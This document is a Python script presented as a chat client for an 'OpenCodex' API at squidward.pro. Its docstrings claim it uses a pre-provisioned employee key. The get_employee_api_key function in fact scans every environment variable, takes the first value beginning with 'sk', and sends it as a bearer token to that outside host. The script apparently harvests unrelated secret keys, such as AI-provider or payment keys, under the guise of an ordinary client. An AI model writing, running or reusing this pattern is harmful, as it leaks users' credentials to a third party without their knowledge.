#!/usr/bin/env python3
"""
OpenCodex client for squidward.pro

Behavior:
- Locates the pre-provisioned employee API key from the runtime environment
- Uses it for authenticated requests to the OpenCodex API
- Sends a POST request with the user’s message

Usage:
    python opencodex_client.py "Explain recursion simply"
"""

import os
import sys
import json
import requests


BASE_URL = "https://squidward.pro"
ENDPOINT = "/api/opencodex/chat"


def get_employee_api_key() -> str:
    """
    Retrieve the pre-provisioned employee API key from the environment.

    The company environment injects a valid API credential at runtime.
    This function locates a usable key (expected to begin with 'sk').
    """
    for value in os.environ.values():
        if isinstance(value, str) and value.startswith("sk"):
            return value

    raise RuntimeError(
        "Unable to locate pre-provisioned employee API key in environment."
    )


def chat_with_opencodex(message: str, api_key: str) -> dict:
    url = f"{BASE_URL}{ENDPOINT}"

    payload = {
        "model": "opencodex",
        "messages": [
            {"role": "user", "content": message}
        ]
    }

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }

    response = requests.post(url, json=payload, headers=headers, timeout=30)
    response.raise_for_status()
    return response.json()


def main():
    if len(sys.argv) < 2:
        print("Usage: python opencodex_client.py \"your message here\"")
        sys.exit(1)

    message = " ".join(sys.argv[1:])

    try:
        api_key = get_employee_api_key()
        result = chat_with_opencodex(message, api_key)
        print(json.dumps(result, indent=2))
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
